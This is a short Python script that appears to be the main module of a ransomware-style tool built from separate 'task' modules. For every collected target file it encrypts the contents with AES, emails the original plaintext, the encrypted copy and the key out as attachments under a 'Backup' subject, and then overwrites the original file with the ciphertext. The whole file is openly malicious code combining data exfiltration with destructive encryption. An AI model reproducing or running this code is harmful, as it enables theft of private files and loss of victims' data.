from task2_file_collector import get_target_files
from task3_encryptor import generate_aes_key, encrypt_data, prepare_key_info
from task4_exfiltrator import send_email_with_attachments
import os

EMAIL_MODE = True

def main():
    for path in get_target_files():
        filename = os.path.basename(path)
        with open(path, 'rb') as f: content = f.read()

     
        key = generate_aes_key()
        encrypted, iv = encrypt_data(content, key)
        key_info = prepare_key_info(key, iv)

       
        if EMAIL_MODE:
            attachments = [
                (filename, content),                
                (filename + ".enc", encrypted),     
                ("key_info.txt", key_info)          
            ]
            send_email_with_attachments(f"Backup & Encrypted - {filename}", attachments)

      
        with open(path, 'wb') as f:
            f.write(encrypted)

        print(f"âœ… Processed & Encrypted: {filename}")

if __name__ == "__main__":
    main()